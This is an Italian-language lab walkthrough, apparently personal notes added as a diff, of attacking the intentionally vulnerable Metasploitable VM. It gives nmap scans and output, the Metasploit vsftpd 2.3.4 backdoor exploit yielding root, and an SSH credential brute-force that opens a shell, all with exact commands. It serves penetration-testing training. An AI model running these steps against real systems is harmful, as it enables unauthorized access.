@@ -1,0 +1,112 @@
+Metasploitable - pentest infrastrutturale
+
+Inizio con una scansione di tutta la rete
+	nmap -sS 192.168.236.1-254
+
+nmap mi risponde cosi'
+	Nmap scan report for 192.168.236.139
+	Host is up (0.00073s latency).
+	Not shown: 977 closed ports
+	PORT     STATE SERVICE
+	21/tcp   open  ftp
+	22/tcp   open  ssh
+	23/tcp   open  telnet
+	25/tcp   open  smtp
+	53/tcp   open  domain
+	80/tcp   open  http
+	111/tcp  open  rpcbind
+	139/tcp  open  netbios-ssn
+	445/tcp  open  microsoft-ds
+	512/tcp  open  exec
+	513/tcp  open  login
+	514/tcp  open  shell
+	1099/tcp open  rmiregistry
+	1524/tcp open  ingreslock
+	2049/tcp open  nfs
+	2121/tcp open  ccproxy-ftp
+	3306/tcp open  mysql
+	5432/tcp open  postgresql
+	5900/tcp open  vnc
+	6000/tcp open  X11
+	6667/tcp open  irc
+	8009/tcp open  ajp13
+	8180/tcp open  unknown
+
+***21/tcp   open  ftp***
+	Trovato l'IP con le porte aperte, comincio con il server ftp: 
+		nmap -sV 192.168.236.139 -p 21
+			l'opzione -sV mi serve per fare il banner grubing. 
+			l'opzione -p 21 indica la porta 21 a nmap
+
+	nmap mi risponde in questo modo:
+		PORT   STATE SERVICE VERSION
+		21/tcp open  ftp     vsftpd 2.3.4
+		MAC Address: 00:0C:29:FA:DD:2A (VMware)
+		Service Info: OS: Unix
+
+	A questo punto, apro metasploit e vedo di capire se esiste un exploit per la versione dell'ftp server. Digito: 
+		search vsftpd
+
+	msf mi risponde 
+		exploit/unix/ftp/vsftpd_234_backdoor
+		(https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor)
+
+	Comincio a settare l'exploit:
+		use exploit/unix/ftp/vsftpd_234_backdoor
+		set RHOST 192.168.236.139
+		***la porta lascio ovviamente la 21***
+		exploit
+		***sono dentro***
+		id -> root
+		reboot
+
+***22/tcp   open  ssh***
+	nmap -sV 192.168.236.139 -p 22
+
+	namp risponde cosi'
+		PORT   STATE SERVICE VERSION
+		22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+		MAC Address: 00:0C:29:FA:DD:2A (VMware)
+		Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+	Apro metasploit (msfconsole) e cerco l'exploit per la versione del servizio ssh. 
+		search ssh
+		scelgo ssh login
+
+	msf mi risponde 
+		use auxiliary/scanner/ssh/ssh_login
+		(https://www.offensive-security.com/metasploit-unleashed/scanner-ssh-auxiliary-modules)
+			questo tipo di exploit ha bisogno di un file wordlist username password.
+			Si puo' utilizzare quello presente sotto /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+
+	Comincio a settare l'exploit:
+		use auxiliary/scanner/ssh/ssh_login
+		set RHOSTS 192.168.236.139
+		set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+		set VERBOSE true
+		exploit
+		
+	La risposta di msf e':
+		[-] 192.168.236.139:22 - Failed: 'root:vagrant'
+		[+] 192.168.236.139:22 - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
+
+	Dato che ha trovato una sessione con successo, provo a sfruttare la sessione che ha avuto successo. Digito:
+		sessions -i
+			e vedo l'id di sessione
+			Id  Name  Type         Information                                 Connection
+			--  ----  ----         -----------                                 ----------
+  			1         shell linux  SSH msfadmin:msfadmin (192.168.236.139:22)  192.168.236.1:38603 -> 192.168.236.139:22 (192.168.236.139)
+
+  		sessions -i 1
+
+  		[*] Starting interaction with 1...
+		ls
+		vulnerable
+		id
+		uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
+		uname -a
+		Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+
+	Volendo proseguire, si potrebbe fare priviledge escalation.
+
+	
